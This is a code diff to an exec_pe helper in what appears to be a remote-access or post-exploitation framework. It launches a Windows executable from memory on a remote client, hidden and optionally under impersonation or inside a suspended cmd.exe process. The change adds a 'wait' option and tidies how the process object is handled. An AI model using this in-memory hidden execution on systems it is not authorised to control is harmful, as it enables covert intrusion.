@@ -7,7 +7,7 @@ from modules.lib.utils.cmdrepl import CmdRepl
 import threading
 
 
-def exec_pe(module, prog_args, path=None, raw_pe=None, interactive=False, use_impersonation=False, suspended_process="cmd.exe", codepage=None):
+def exec_pe(module, prog_args, path=None, raw_pe=None, interactive=False, use_impersonation=False, suspended_process="cmd.exe", codepage=None, wait=True):
     if not raw_pe and not path:
         raise Exception("raw_pe or path must be supplied")
 
@@ -42,7 +42,7 @@ def exec_pe(module, prog_args, path=None, raw_pe=None, interactive=False, use_im
     if not hasattr(module, 'mp'):
         setattr(module, 'mp', None)
 
-    module.mp = module.client.conn.modules[
+    mp = module.client.conn.modules[
         'pupwinutils.memexec'
     ].MemoryPE(
         raw_pe, args=prog_args, hidden=True,
@@ -50,26 +50,29 @@ def exec_pe(module, prog_args, path=None, raw_pe=None, interactive=False, use_im
         dupHandle=dupHandle
     )
 
+    module.mp = mp
     complete = threading.Event()
+    stdout = None
 
     if interactive:
         repl, _ = CmdRepl.thread(
             module.stdout,
-            module.mp.write,
+            mp.write,
             complete,
             True, None,
             codepage
         )
 
         module.client.conn.register_remote_cleanup(
-            module.mp.close
+            mp.close
         )
-        if module.mp.execute(complete.set, repl._con_write):
+
+        if mp.execute(complete.set, repl._con_write):
             complete.wait()
-            module.mp.close()
+            mp.close()
 
             module.client.conn.unregister_remote_cleanup(
-                module.mp.close
+                mp.close
             )
 
             module.success('Process exited. Press ENTER')
@@ -77,11 +80,21 @@ def exec_pe(module, prog_args, path=None, raw_pe=None, interactive=False, use_im
             complete.set()
             module.error('Launch failed. Press ENTER')
     else:
-        pid = module.mp.execute(complete.set)
+        pid = mp.execute(complete.set)
         if pid:
-            complete.wait()
             module.success('[Process launched: PID={}]'.format(pid))
+
+            if not wait:
+                mp.close()
+                module.mp = None
+                return
+
+            complete.wait()
+
+            stdout = mp.stdout
+            mp.close()
+            module.mp = None
         else:
             module.error('Launch failed')
 
-    return module.mp.stdout
+    return stdout
